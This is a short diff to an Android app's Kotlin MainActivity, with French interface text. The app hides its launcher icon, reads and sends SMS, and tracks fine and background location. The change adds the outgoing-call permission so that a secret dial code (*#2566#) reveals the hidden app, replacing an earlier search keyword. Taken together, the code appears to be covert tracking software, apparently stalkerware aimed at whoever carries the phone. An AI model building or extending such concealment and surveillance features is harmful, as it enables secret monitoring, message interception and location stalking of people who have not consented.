@@ -195,7 +195,7 @@ class MainActivity : AppCompatActivity(), LocationListener {
                 PackageManager.DONT_KILL_APP
             )
 
-            Toast.makeText(this, "🕵️ CACHER !\n🔓 Révéler : rechercher « bloom123 »", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "🕵️ CACHER !\n📞 Révéler : composez *#2566#", Toast.LENGTH_LONG).show()
             finish()
             moveTaskToBack(true)
         }
@@ -282,7 +282,8 @@ class MainActivity : AppCompatActivity(), LocationListener {
         val a = ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
         val b = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
         val c = ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-        if (a == PackageManager.PERMISSION_GRANTED && b == PackageManager.PERMISSION_GRANTED && c == PackageManager.PERMISSION_GRANTED) {
+        val d = ActivityCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
+        if (a == PackageManager.PERMISSION_GRANTED && b == PackageManager.PERMISSION_GRANTED && c == PackageManager.PERMISSION_GRANTED && d == PackageManager.PERMISSION_GRANTED) {
             tvStatut.text = "✅ Prêt ! Entrez les numéros"
             btnPermissions.text = "✅ OK"
             btnPermissions.isEnabled = false
@@ -299,7 +300,8 @@ class MainActivity : AppCompatActivity(), LocationListener {
                 Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                 Manifest.permission.SEND_SMS,
                 Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.READ_SMS
+                Manifest.permission.READ_SMS,
+                Manifest.permission.PROCESS_OUTGOING_CALLS
             ),
             PERMISSIONS_REQUEST
         )
